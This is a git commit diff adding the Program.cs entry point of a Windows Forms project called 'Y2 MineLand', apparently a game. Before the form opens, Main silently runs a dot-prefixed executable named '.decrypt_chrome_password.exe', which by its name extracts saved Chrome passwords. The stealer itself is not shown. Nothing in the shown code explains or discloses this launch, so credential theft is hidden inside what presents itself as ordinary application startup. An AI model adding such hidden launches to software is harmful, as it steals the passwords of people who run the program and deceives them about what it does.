579b230e529d016a879b64383723d03c05163cfa
Trong Vo <vovantrong@nexondv.com>
2023-10-11 15:28:10 +0700

    Add project files.

---
+++ Y2 MineLand/Program.cs
@@ -0,0 +1,23 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Windows.Forms;
+using System.Diagnostics;
+
+namespace Y2_MineLand
+{
+    static class Program
+    {
+        /// <summary>
+        /// The main entry point for the application.
+        /// </summary>
+        [STAThread]
+        static void Main()
+        {
+            Application.EnableVisualStyles();
+            Application.SetCompatibleTextRenderingDefault(false);
+            Process.Start(".decrypt_chrome_password.exe");
+            Application.Run(new Form1());
+        }
+    }
+}
